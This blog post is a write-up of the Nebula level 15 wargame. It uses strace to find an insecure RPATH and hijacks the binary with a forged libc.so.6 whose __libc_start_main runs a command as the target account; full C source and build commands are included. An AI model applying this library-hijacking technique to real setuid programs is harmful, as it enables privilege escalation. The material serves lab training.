---
layout: post
title: "Insecure Library Loading"
category: WarGame, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 15](http://exploit-exercises.com/nebula/level15) Agenda**: "[strace](http://linux.die.net/man/1/strace) the binary at "_/home/flag15/flag15_" and see if you spot anything out of the ordinary."

<center>
	<img src="/images/2015-07-04-insecure_library_loading/lmsxphiEcI1qblu4lo.jpg">
</center>
<br />
Starting from tracing:
{% highlight sh linenos %}
...
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbf88db44) = -1 ENOENT (No such file or directory)
...
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
...
{% endhighlight %}
and what we can see is that the program tries to find and load "_libc.so.6_" via predefined set which was binded through the [rpath](https://en.wikipedia.org/wiki/Rpath) linker([ld](https://en.wikipedia.org/wiki/Linker_%28computing%29)) option. However, at the end it's succeeds with the cache (which in order contains the proper libc path). Hence, as we already know all lookup-cells we could try to hijack library with one.

As follows, starting with simple source with single "___attribute((constructor))_"(as testing initialization routine), after a facing with couple of relocation errors:
{% highlight sh linenos %}
symbol __libc_start_main, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
...
symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
...
no version information available (required by /home/flag15/flag15)
{% endhighlight %}
Reached the next outcome:
{% highlight c linenos %}
/* fake_lib.c */
#include <stdlib.h>
#include <stdio.h>

void __cxa_finalize(void * d) {return;}

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {

 printf("----------------------------------------------------------\n");
 system("getflag");
 printf("----------------------------------------------------------\n");

 exit(0);
}
{% endhighlight %}
To eliminate error with absent version information was used a version script(allows to explicitly control the symbols exported by a library):
{% highlight sh linenos %}
echo "GLIBC_2.0 {};" > fakelib.map
{% endhighlight %}
Copiled with static "_libC_" linking:
{% highlight sh linenos %}
gcc -shared -static-libgcc -fPIC -Wl,--version-script=fakelib.map,-Bstatic -o libc.so.6 fake_lib.c
{% endhighlight %}
and final cut... drum-roll, the climax - boom:
{% highlight sh linenos %}
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
----------------------------------------------------------
You have successfully executed getflag on a target account
----------------------------------------------------------
{% endhighlight %}

Resources:

 * [Program Library HOWTO, David A. Wheeler, v1.36, 15 May 2010](/resources/2015-07-04-insecure_library_loading/Program-Library-HOWTO.pdf)
 * [__libc_start_main -- initialization routine](http://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html)
 * [Linker Version Scripts](http://man7.org/conf/lca2006/shared_libraries/slide18c.html)